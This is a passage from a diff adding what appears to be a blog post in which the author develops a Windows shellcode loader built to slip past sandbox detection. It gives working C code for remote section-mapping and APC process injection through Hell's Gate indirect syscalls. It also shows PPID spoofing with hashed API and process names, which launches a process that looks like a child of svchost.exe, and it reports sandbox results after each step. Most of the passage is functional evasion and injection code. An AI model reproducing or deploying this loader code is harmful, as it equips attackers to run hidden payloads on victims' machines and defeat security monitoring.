+</span></span><span style="display:flex;"><span>	IN	PBYTE			pBlob,
+</span></span><span style="display:flex;"><span>	IN	SIZE_T			sBlobSize,
+</span></span><span style="display:flex;"><span>	OUT	PBYTE<span style="color:#f92672">*</span>			ppBlobCopyAddress
+</span></span><span style="display:flex;"><span>) {
+</span></span><span style="display:flex;"><span>	BOOL		bSTATE <span style="color:#f92672">=</span> TRUE;
+</span></span><span style="display:flex;"><span>	HANDLE		hSection <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	PVOID		pMapLocalAddress <span style="color:#f92672">=</span> NULL,
+</span></span><span style="display:flex;"><span>				pMapRemoteAddress <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	NTSTATUS	STATUS <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	SIZE_T			sViewSize <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	LARGE_INTEGER	MaximumSize <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>		.HighPart <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>		.LowPart <span style="color:#f92672">=</span> sBlobSize
+</span></span><span style="display:flex;"><span>	};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">HellsGate</span>(pSyscallTable<span style="color:#f92672">-&gt;</span>NtCreateSection.dwSSn, pSyscallTable<span style="color:#f92672">-&gt;</span>NtCreateSection.pSyscallInstAddress);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ((STATUS <span style="color:#f92672">=</span> <span style="color:#a6e22e">HellDescent</span>(<span style="color:#f92672">&amp;</span>hSection, SECTION_RWX, NULL, <span style="color:#f92672">&amp;</span>MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;NtCreateSection failed with error: 0x%0.8X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, STATUS);
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> _EndOfFunction;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">HellsGate</span>(pSyscallTable<span style="color:#f92672">-&gt;</span>NtMapViewOfSection.dwSSn, pSyscallTable<span style="color:#f92672">-&gt;</span>NtMapViewOfSection.pSyscallInstAddress);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ((STATUS <span style="color:#f92672">=</span> <span style="color:#a6e22e">HellDescent</span>(hSection, (HANDLE)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>pMapLocalAddress, NULL, NULL, NULL, <span style="color:#f92672">&amp;</span>sViewSize, ViewShare, NULL, PAGE_READWRITE)) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;NtMapViewOfSection failed with error: 0x%0.8X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, STATUS);
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> _EndOfFunction;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memcpy</span>(pMapLocalAddress, pBlob, sBlobSize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">HellsGate</span>(pSyscallTable<span style="color:#f92672">-&gt;</span>NtMapViewOfSection.dwSSn, pSyscallTable<span style="color:#f92672">-&gt;</span>NtMapViewOfSection.pSyscallInstAddress);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ((STATUS <span style="color:#f92672">=</span> <span style="color:#a6e22e">HellDescent</span>(hSection, hProcess, <span style="color:#f92672">&amp;</span>pMapRemoteAddress, NULL, NULL, NULL, <span style="color:#f92672">&amp;</span>sViewSize, ViewShare, NULL, PAGE_EXECUTE_READ)) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;NtMapViewOfSection failed with error: 0x%0.8X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, STATUS);
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> _EndOfFunction;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>ppBlobCopyAddress <span style="color:#f92672">=</span> pMapRemoteAddress;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_EndOfFunction:
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hSection) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">HellsGate</span>(pSyscallTable<span style="color:#f92672">-&gt;</span>NtClose.dwSSn, pSyscallTable<span style="color:#f92672">-&gt;</span>NtClose.pSyscallInstAddress);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ((STATUS <span style="color:#f92672">=</span> <span style="color:#a6e22e">HellDescent</span>(hSection)) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;NtMapViewOfSection failed with error: 0x%0.8X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, STATUS);
+</span></span><span style="display:flex;"><span>			bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> bSTATE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Similarly, I modified the APC-Injection function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">ScheduleRun</span>(
+</span></span><span style="display:flex;"><span>	IN	PSYSCALL_TABLE	pSyscallTable,
+</span></span><span style="display:flex;"><span>	IN	HANDLE			hThread,
+</span></span><span style="display:flex;"><span>	IN	PBYTE			pBlobAddress
+</span></span><span style="display:flex;"><span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	NTSTATUS STATUS <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">HellsGate</span>(pSyscallTable<span style="color:#f92672">-&gt;</span>NtQueueApcThread.dwSSn, pSyscallTable<span style="color:#f92672">-&gt;</span>NtQueueApcThread.pSyscallInstAddress);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ((STATUS <span style="color:#f92672">=</span> <span style="color:#a6e22e">HellDescent</span>(hThread, pBlobAddress, NULL, NULL, NULL)) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;NtQueueApcThread failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="did-it-work">Did it work?</h3>
+<p>I ran the new loader through the sandbox and inspected the behavioural analysis for the function trace. Unlike the previous iteration, all the functions related to remote-mapping injection and the call for APC injection were gone.</p>
+<p><img src="./netutil6-function-sequence.png" alt="netutil6-function-sequence"></p>
+<p>But the functions related to process-creation were still being monitored. I believe they provided the sandbox with process tree information which was correctly detected in this iteration as well.</p>
+<p><img src="./netutil6-process-tree.png" alt="netutil6-process-tree"></p>
+<h2 id="the-process-of-hiding-the-process">The process of hiding the Process</h2>
+<p>To evade the parent-child co-relation of processes, I planned to perform <strong>PPID-spoofing</strong> (PPID: Parent Process ID). My plan being to launch a non-suspicious process (here: <code>dllhost.exe</code>) as if it were started by a non-suspicious parent (here: <code>svchost.exe</code>).</p>
+<p>The WinAPI function <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw"><code>CreateProcessW</code></a> expects <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfow"><code>STARTUPINFO</code></a> or <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexw"><code>STARTUPINFOEX</code></a> structure to provide with information relating to process creation. The <code>STARTUPINFOEX</code> structure is an extension of <code>STARTUPINFO</code> that adds an attribute list <code>LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList</code> for process/thread creation.</p>
+<p>Using this attribute-list, one may provide a handle to a process that is to act as parent of the child process being created.</p>
+<h3 id="hunting-the-handle">Hunting the handle</h3>
+<p>To find the handle for parent process (<code>svchost.exe</code>), I had to enumerate through all running processes and find an <code>svchost.exe</code> process whose handle I could retrieve. I leveraged the Native API <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation"><code>NtQuerySystemInformation</code></a> as I had the code for indirect syscall already built.</p>
+<p>I started with declaring the Native API&rsquo;s hash and <code>svchost.exe</code>&rsquo;s hash to reduce the plain-string footprint.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// All the syscalls that I&#39;ll need
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _SYSCALL_TABLE {
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// CODE MENTIONED BEFORE ...
+</span></span></span><span style="display:flex;"><span>	NT_SYSCALL NtQuerySystemInformation;
+</span></span><span style="display:flex;"><span>} SYSCALL_TABLE, <span style="color:#f92672">*</span> PSYSCALL_TABLE;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">// define hash for parent process
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">constexpr</span> ULONG	svchost_FnvvW <span style="color:#f92672">=</span> HashStringFowlerNollVoVariant1aW(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;svchost.exe&#34;</span>);
+</span></span></code></pre></div><p>Next, I searched for the SSN and the <code>syscall</code> instruction address for <code>NtQuerySystemInformation</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">ResolveSyscalls</span>(
+</span></span><span style="display:flex;"><span>	OUT PSYSCALL_TABLE<span style="color:#f92672">*</span>	ppSyscallTable
+</span></span><span style="display:flex;"><span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// CODE MENTIONED BEFORE ...
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">GetSyscallAddress</span>(pNtdll, NtQuerySystemInformation_FnvvA, <span style="color:#f92672">&amp;</span>pSysTable<span style="color:#f92672">-&gt;</span>NtQuerySystemInformation)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to resolve NtQuerySystemInformation.&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">NtQuerySystemInformation</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> syscall number: %d</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">`syscall` instruction address: 0x%p&#34;</span>, pSysTable<span style="color:#f92672">-&gt;</span>NtQuerySystemInformation.dwSSn, pSysTable<span style="color:#f92672">-&gt;</span>NtQuerySystemInformation.pSyscallInstAddress);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>ppSyscallTable <span style="color:#f92672">=</span> pSysTable;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Finally, I was ready to implement a process-search logic that</p>
+<ul>
+<li>Enumerated through all the processes on the system</li>
+<li>Validated if the process name was <code>svchost.exe</code> using its hash
+<ul>
+<li>If true, it tried to open a handle to the process
+<ul>
+<li>If successful, it returned the handle</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Moved onto the next process</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">GetPsuedoParentProcess</span>(
+</span></span><span style="display:flex;"><span>	IN	PSYSCALL_TABLE	pSyscallTable,			<span style="color:#75715e">// the syscall table with information for NtQuerySystemInformation
+</span></span></span><span style="display:flex;"><span>	IN	ULONG			uParentProcNameHash,	<span style="color:#75715e">// the hash of target parent process
+</span></span></span><span style="display:flex;"><span>	OUT	PHANDLE			phProcess				<span style="color:#f92672">//</span> <span style="color:#a6e22e">output</span> (parent process<span style="color:#960050;background-color:#1e0010">&#39;</span>s handle) to be returned
+</span></span><span style="display:flex;"><span>) {
+</span></span><span style="display:flex;"><span>	NTSTATUS					STATUS <span style="color:#f92672">=</span> STATUS_SUCCESS;
+</span></span><span style="display:flex;"><span>	BOOL						bSTATE <span style="color:#f92672">=</span> TRUE;
+</span></span><span style="display:flex;"><span>	PSYSTEM_PROCESS_INFORMATION pSystemProcInfo <span style="color:#f92672">=</span> NULL,
+</span></span><span style="display:flex;"><span>								pSystemProcInfoCopy <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	ULONG						SystemProcInfoSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(SYSTEM_PROCESS_INFORMATION);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pSystemProcInfo <span style="color:#f92672">=</span> (PSYSTEM_PROCESS_INFORMATION)<span style="color:#a6e22e">HeapAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, SystemProcInfoSize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pSystemProcInfo) {
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE; <span style="color:#66d9ef">goto</span> _EoF;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">HellsGate</span>(pSyscallTable<span style="color:#f92672">-&gt;</span>NtQuerySystemInformation.dwSSn, pSyscallTable<span style="color:#f92672">-&gt;</span>NtQuerySystemInformation.pSyscallInstAddress);
+</span></span><span style="display:flex;"><span>	STATUS <span style="color:#f92672">=</span> <span style="color:#a6e22e">HellDescent</span>(SystemProcessInformation, pSystemProcInfo, SystemProcInfoSize, <span style="color:#f92672">&amp;</span>SystemProcInfoSize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> (STATUS <span style="color:#f92672">==</span> STATUS_INFO_LENGTH_MISMATCH) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, pSystemProcInfo);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		pSystemProcInfo <span style="color:#f92672">=</span> (PSYSTEM_PROCESS_INFORMATION)<span style="color:#a6e22e">HeapAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, SystemProcInfoSize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pSystemProcInfo) {
+</span></span><span style="display:flex;"><span>			bSTATE <span style="color:#f92672">=</span> FALSE; <span style="color:#66d9ef">goto</span> _EoF;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">HellsGate</span>(pSyscallTable<span style="color:#f92672">-&gt;</span>NtQuerySystemInformation.dwSSn, pSyscallTable<span style="color:#f92672">-&gt;</span>NtQuerySystemInformation.pSyscallInstAddress);
+</span></span><span style="display:flex;"><span>		STATUS <span style="color:#f92672">=</span> <span style="color:#a6e22e">HellDescent</span>(SystemProcessInformation, pSystemProcInfo, SystemProcInfoSize, <span style="color:#f92672">&amp;</span>SystemProcInfoSize);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (STATUS <span style="color:#f92672">!=</span> STATUS_SUCCESS) {
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE; <span style="color:#66d9ef">goto</span> _EoF;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pSystemProcInfoCopy <span style="color:#f92672">=</span> pSystemProcInfo;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (pSystemProcInfo<span style="color:#f92672">-&gt;</span>ImageName.Length <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">RTIME_FnvHashW</span>(pSystemProcInfo<span style="color:#f92672">-&gt;</span>ImageName.Buffer) <span style="color:#f92672">==</span> uParentProcNameHash) {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Found Parent Process PID: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (DWORD)pSystemProcInfo<span style="color:#f92672">-&gt;</span>UniqueProcessId);
+</span></span><span style="display:flex;"><span>			<span style="color:#f92672">*</span>phProcess <span style="color:#f92672">=</span> <span style="color:#a6e22e">OpenProcess</span>(PROCESS_CREATE_PROCESS, FALSE, (DWORD)pSystemProcInfo<span style="color:#f92672">-&gt;</span>UniqueProcessId);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		pSystemProcInfo <span style="color:#f92672">=</span> (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pSystemProcInfo <span style="color:#f92672">+</span> pSystemProcInfo<span style="color:#f92672">-&gt;</span>NextEntryOffset);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">while</span> (pSystemProcInfo<span style="color:#f92672">-&gt;</span>NextEntryOffset <span style="color:#f92672">!=</span> NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>phProcess <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE; <span style="color:#66d9ef">goto</span> _EoF;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_EoF:
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (pSystemProcInfoCopy) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, pSystemProcInfoCopy);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> bSTATE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Notice how it uses the HellsGate stubs for indirect call and <code>RTIME_FnvHashW</code> runtime-hash-calculation functions for hash comparison.</p>
+<h3 id="updating-child-process">Updating Child Process</h3>
+<p>Leveraging the attribute-list described earlier, I populated the parent process&rsquo;s handle through <code>STARTUPINFOEXW</code> structure using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist"><code>InitializeProcThreadAttributeList</code></a> and <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute"><code>UpdateProcThreadAttribute</code></a> functions.</p>
+<ul>
+<li><code>InitializeProcThreadAttributeList</code> being used to populate the attribute list with default information.</li>
+<li><code>UpdateProcThreadAttribute</code> being used to update the information as per need, here the parent process.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">CreateSuspendedProcess</span>(
+</span></span><span style="display:flex;"><span>	IN	PH_API	pHashedApis,		<span style="color:#75715e">// A collection of WINAPI functions resolved through compile-time API hashing
+</span></span></span><span style="display:flex;"><span>	IN	LPCWSTR	lpszProcessName,	<span style="color:#75715e">// Process to be created
+</span></span></span><span style="display:flex;"><span>	IN	HANDLE	hParentProcess,		<span style="color:#75715e">// Parent Process handle to be imitated
+</span></span></span><span style="display:flex;"><span>	OUT	PHANDLE	phProcess,			<span style="color:#75715e">// Child Process handle
+</span></span></span><span style="display:flex;"><span>	OUT	PHANDLE	phThread,			<span style="color:#75715e">// Child Process&#39;s main thread handle
+</span></span></span><span style="display:flex;"><span>	OUT	PDWORD	pdwProcessID		<span style="color:#75715e">// Child Process&#39;s ID
+</span></span></span><span style="display:flex;"><span>) {
+</span></span><span style="display:flex;"><span>	BOOL	bSTATE <span style="color:#f92672">=</span> TRUE;
+</span></span><span style="display:flex;"><span>	WCHAR	lpszTargetProcessPath[MAX_PATH <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>];
+</span></span><span style="display:flex;"><span>	WCHAR	SysDir[MAX_PATH],
+</span></span><span style="display:flex;"><span>			WinDir[MAX_PATH];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	SIZE_T	sThreadAttrListSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	STARTUPINFOEXW	Si <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>	PROCESS_INFORMATION Pi <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">GetEnvironmentVariableW</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;WINDIR&#34;</span>, WinDir, MAX_PATH)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;GetEnvironmentVariableW failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> _EoF;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">swprintf_s</span>(SysDir, MAX_PATH, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32&#34;</span>, WinDir);									<span style="color:#75715e">// Eg: C:\Windows\System32, for current directory of child process
+</span></span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">swprintf_s</span>(lpszTargetProcessPath, MAX_PATH <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">%s&#34;</span>, SysDir, lpszProcessName);	<span style="color:#75715e">// Eg: C:\Windows\System32\Notepad.exe
+</span></span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// This will fail with ERROR_INSUFFICIENT_BUFFER, but write the required size in `sThreadAttrListSize`
+</span></span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">InitializeProcThreadAttributeList</span>(NULL, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>sThreadAttrListSize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	Si.lpAttributeList <span style="color:#f92672">=</span> (PPROC_THREAD_ATTRIBUTE_LIST)<span style="color:#a6e22e">HeapAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, sThreadAttrListSize);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Si.lpAttributeList) {
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE; <span style="color:#66d9ef">goto</span> _EoF;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">InitializeProcThreadAttributeList</span>(Si.lpAttributeList, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>sThreadAttrListSize);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// PPID Spoofing
+</span></span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">UpdateProcThreadAttribute</span>(Si.lpAttributeList, <span style="color:#ae81ff">0</span>, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, <span style="color:#f92672">&amp;</span>hParentProcess, <span style="color:#66d9ef">sizeof</span>(HANDLE), NULL, NULL)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;UpdateProcThreadAttribute failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE; <span style="color:#66d9ef">goto</span> _EoF;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	Si.StartupInfo.cb <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(STARTUPINFOEXW);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pHashedApis<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">pCreateProcessW</span>(NULL, lpszTargetProcessPath, NULL, NULL, FALSE, DEBUG_PROCESS <span style="color:#f92672">|</span> EXTENDED_STARTUPINFO_PRESENT, NULL, SysDir, <span style="color:#f92672">&amp;</span>Si, <span style="color:#f92672">&amp;</span>Pi)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;CreateProcessW failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE; <span style="color:#66d9ef">goto</span> _EoF;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>phProcess <span style="color:#f92672">=</span> Pi.hProcess;
